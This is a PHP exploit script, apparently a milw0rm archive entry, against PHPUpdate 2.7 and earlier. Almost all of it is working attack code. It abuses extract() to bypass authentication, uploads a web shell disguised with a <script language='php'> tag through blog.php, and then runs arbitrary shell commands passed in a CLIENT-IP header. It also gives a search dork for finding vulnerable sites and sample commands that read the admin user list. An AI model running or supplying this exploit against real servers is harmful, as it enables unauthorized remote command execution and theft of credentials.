<?php
print_r('
---------------------------------------------------------------------------
PHPUpdate <= 2.7 extract() auth bypass / shell inject
by rgod
dork: "Powered by PHP-Update" -site:www.php-update.co.uk
mail: retrog at alice dot it
site: http://retrogod.altervista.org
---------------------------------------------------------------------------
');
/*
this works regardless of php.ini settings
and against the flat-file version...
*/

if ($argc<4) {
    print_r('
---------------------------------------------------------------------------
Usage: php '.$argv[0].' host path cmd OPTIONS
host:      target server (ip/hostname)
path:      path to PHPUpdate
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php '.$argv[0].' localhost /phpupdate/ ls -la -P1.1.1.1:80
php '.$argv[0].' localhost / cat ./../../admin/userlist.php -p81
---------------------------------------------------------------------------
');
    die;
}
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

$host=$argv[1];
$path=$argv[2];
$port=80;
$proxy="";
$cmd="";
for ($i=3; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}
srand(make_seed());
$v = rand(111111,999999);

/*
software site: http://www.php-update.co.uk/

another funny extract() issue, vulnerable code in blog.php:

<?php

extract($HTTP_POST_VARS);
extract($HTTP_GET_VARS);
extract($HTTP_COOKIE_VARS);
...

let me say... tnx!
so, you can overwrite $adminuser and $permission arguments
and every var you wanr

we cannot use <?php or <? to initiate code, because we have
  ...
  $newmessage = str_replace("<?", "&lt;?", $newmessage);
  ...
in blog.php, however this syntax is always avaliable,
see php man page for basic syntax
also this bypass magic_quotes_gpc because of the stripslashes() on
$newmessage argument
also, note this, we have a directory traversal in "f" argument
but I prefer posts because we do not have an .htaccess in blogs/posts/ folder
"0.php" string is appended to a new post filename
*/

$shell='<script language="php">error_reporting(0); set_time_limit(0); echo "my_delim"; passthru($_SERVER[HTTP_CLIENT_IP]); echo "my_delim";</script>';

$data='-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="f";

suntzu_'.$v.'
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="newmessage";

'.$shell.'
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="newusername";

1
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="adminuser";

1
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="permission";

1
-----------------------------7d61bcd1f033e--
';
$packet ="POST ".$p."blog.php HTTP/1.0\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d61bcd1f033e\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
sleep(2);

$packet ="GET ".$p."blogs/posts/suntzu_".$v."0.php HTTP/1.0\r\n";
$packet.="CLIENT-IP:".$cmd."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: close\r\n\r\n";
sendpacketii($packet);
if (eregi("my_delim",$html)) {
    $temp=explode("my_delim",$html);
    echo $temp[1];
}
else {
    echo "exploit failed...";
}
?>

# milw0rm.com [2006-12-19]
